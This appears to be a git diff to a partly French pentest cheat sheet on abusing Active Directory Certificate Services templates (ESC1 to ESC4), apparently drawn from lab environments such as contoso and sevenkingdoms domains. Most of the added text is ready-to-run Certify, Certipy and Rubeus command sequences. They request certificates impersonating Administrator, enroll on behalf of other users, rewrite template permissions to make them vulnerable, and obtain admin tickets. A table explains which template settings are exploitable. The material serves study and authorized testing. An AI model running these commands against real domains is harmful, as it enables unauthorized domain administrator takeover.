@@ -7,6 +7,14 @@ https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-cert
 curl -k https://dc.domain.local/certsrv
 nmap -p 443,80 --script http-title <dc_ip>
 ```
+
+## Certify
+```powershell
+cd C:\Tools\Certify\Certify\bin\Release
+.\Certify.exe enum-cas
+.\Certify.exe enum-templates
+.\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
+```
 ## Certipy
 ```bash
 certipy find -u user@domain.local -p 'Password' -dc-ip 192.168.1.1
@@ -21,23 +29,158 @@ netexec ldap domain.lab -u username -p password -M adcs
 ldapsearch -H ldap://dc_IP -x -LLL -D 'user@domain.local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
 ```
 
+# Certifpy output
+
+| Champ                              | Description                                                                                                                                             |
+| ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `Template Name`                    | Nom du template de certificat dans l'AD                                                                                                                 |
+| `Enabled`                          | Indique si le template est actif et utilisable                                                                                                          |
+| `Publishing CAs`                   | CA(s) qui publient ce template et acceptent les requêtes dessus                                                                                         |
+| `Schema Version`                   | Version du schéma du template (1 = ancien, 2+ = supporte les extensions avancées)                                                                       |
+| `Validity Period`                  | Durée de validité du certificat émis                                                                                                                    |
+| `Renewal Period`                   | Période avant expiration pendant laquelle un renouvellement est possible                                                                                |
+| `Certificate Name Flag`            | Contrôle qui définit le sujet du certificat. Vuln si `ENROLLEE_SUPPLIES_SUBJECT` (le demandeur choisit le SAN → ESC1)                                   |
+| `Enrollment Flag`                  | Options supplémentaires appliquées lors de l'enrollment. Vuln si `CT_FLAG_NO_SECURITY_EXTENSION` (pas d'extension szOID → ESC9/ESC10)                   |
+| `Manager Approval Required`        | Indique si un admin CA doit approuver manuellement chaque requête. Vuln si `False` (pas de contrôle humain)                                             |
+| `Authorized Signatures Required`   | Nombre de signatures nécessaires pour soumettre une requête. Vuln si `0` (pas besoin d'enrollment agent)                                                |
+| `Extended Key Usage`               | Usages autorisés. Vuln si `Client Authentication`, `Smart Card Logon`, `PKINIT Client Authentication`, `Any Purpose`, ou vide (aucun EKU = tout usage)  |
+| `Certificate Application Policies` | Politiques d'application associées, souvent identiques à l'EKU sur les templates v2+. Mêmes valeurs vulnérables que l'EKU                               |
+| `Vulnerabilities`                  | Classification automatique par Certify des vulnérabilités détectées sur ce template                                                                     |
+| `Enrollment Rights`                | Groupes/utilisateurs autorisés à demander un certificat. Vuln si un groupe large type `Domain Users`, `Domain Computers`, `Authenticated Users`         |
+| `Object Control Permissions`       | ACLs sur l'objet template dans l'AD. Vuln si `WriteDacl`, `WriteOwner`, `WriteProperty`, `GenericAll`, `GenericWrite` pour un groupe non-admin (→ ESC4) |
+
 # ESC1
 
-1. Enumerate the certificate authority for vulnerable templates.
+## Pré-requis
+
 ```
-execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
+Enabled                               : True
+Certificate Name Flag                 : ENROLLEE_SUPPLIES_SUBJECT
+Manager Approval Required             : False
+Authorized Signatures Required        : 0
+Extended Key Usage                    : Client Authentication
+Certificate Application Policies      : Client Authentication
+Permissions
+  Enrollment Permissions
+	Enrollment Rights           : CONTOSO\Domain Users
+```
+## Certify
+```powershell
+.\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
 ```
 
-2. Request a certificate, specifying the default domain Administrator's _UserPrincipalName_ in the certificate's Subject Alternative Name (SAN).
+```powershell
+.\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
 ```
-execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
-```
-
-3. Use Rubeus to request a TGT for Administrator.
-```
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
+## Certipy
+```bash
+certipy req -u 'jaime.lannister'@sevenkingdoms.local -p 'pasdebraspasdechocolat' -target kingslanding.sevenkingdoms.local -template ESC1 -ca SEVENKINGDOMS-CA -upn administrator@sevenkingdoms.local
 ```
 
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
+```
+
+
+# ESC2
+```
+Enabled                               : True
+Manager Approval Required             : False
+Authorized Signatures Required        : 0
+Extended Key Usage                    : Any Purpose
+Certificate Application Policies      : Any Purpose
+Permissions
+  Enrollment Permissions
+	Enrollment Rights           : CONTOSO\Domain Users
+```
+
+- Si Certificate Name Flag: ENROLLEE_SUPPLIES_SUBJECT -> ESC1
+- Si non -> ESC3
+
+# ESC3
+## Pré-requis
+```
+Enabled                               : True
+Manager Approval Required             : False
+Authorized Signatures Required        : 0
+Extended Key Usage                    : Certificate Request Agent
+Certificate Application Policies      : Certificate Request Agent
+Permissions
+  Enrollment Permissions
+	Enrollment Rights           : CONTOSO\Domain Users
+```
+## Certify
+
+First, request a certificate from this template using your current user context.
+```powershell
+.\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC3 --quiet
+```
+
+Then use that certificate to request another certificate on behalf of another user.  A template such as _User_ is a good candidate to use, because it has the Client Authentication EKU enabled.
+```powershell
+\Certify.exe request-agent --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template User --target Administrator --agent-pfx MIACAQ[...snip...]AAAAA= --quiet
+```
+
+## Certipy
+
+Query cert
+```bash
+certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA
+```
+Query cert with the Certificate Request Agent certificate we get before (-pfx)
+```bash
+certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
+```
+Auth
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
+```
+
+# ESC4
+
+## Pré-requis
+
+```
+Permissions
+  Enrollment Permissions
+	Enrollment Rights           : CONTOSO\Domain Users
+  Object Control Permissions
+	Write Owner                 : CONTOSO\Domain Users
+	Write Dacl                  : CONTOSO\Domain Users
+	Write Property              : CONTOSO\Domain Users
+```
+## Certify
+Certify's `manage-template` command can abuse these permissions.  You can:
+- Grant yourself enrollment rights using `--enroll <sid>` where `<sid>` is the SID of a principal (e.g. a domain user or group).
+- Toggle manager approval (on or off) using `--manager-approval` and set the number of required authorised signatures `--authorized-signatures 0`.
+- Toggle EKUs that allow client authentication using `--client-auth`, `--pkinit-auth` or `--smartcard-logon`.
+- Toggle the **ENROLLEE_SUPPLIES_SUBJECT** flag using `--supply-subject`.
+
+In this example, the _Client Authentication_ EKU is already enabled, so just add the **ENROLLEE_SUPPLIES_SUBJECT** flag and then mimic ESC1.
+
+```powershell
+.\Certify.exe manage-template --template ESC4 --supply-subject --quiet
+```
+## Certipy
+Take the ESC4 template and change it to be vulnerable to ESC1 technique by using the genericWrite privilege we got. (we didn’t set the target here as we target the ldap)
+```bash
+certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug
+```
+
+Exploit ESC1 on the modified ESC4 template
+```bash
+certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local
+```
+
+authentication with the pfx
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
+```
+
+Rollback the template configuration
+```bash
+certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
+```
 # ESC8
 
 Pré-requis :
